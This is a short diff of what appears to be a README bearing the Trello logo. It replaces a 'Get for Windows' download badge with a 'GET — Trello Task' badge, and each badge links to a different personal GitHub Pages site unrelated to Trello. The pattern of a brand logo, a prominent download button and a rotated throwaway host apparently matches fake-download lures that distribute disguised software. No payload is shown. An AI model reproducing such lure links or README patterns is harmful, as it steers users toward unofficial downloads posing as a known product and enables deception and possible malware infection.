@@ -4,10 +4,8 @@
   <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8c/Trello_logo.svg/960px-Trello_logo.svg.png" alt="Trello Logo"/>
 </div>
 
-<div align="center">
+[![GET Trello Task](https://img.shields.io/badge/GET%20%E2%80%94%20Trello-Task-0078D6?style=for-the-badge&logoColor=white)](https://byrdsongbaretta.github.io/.github/Trello-Task)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://kraignery.github.io/.github/Trello-Task-Management)
-</div>
 
 ---
 
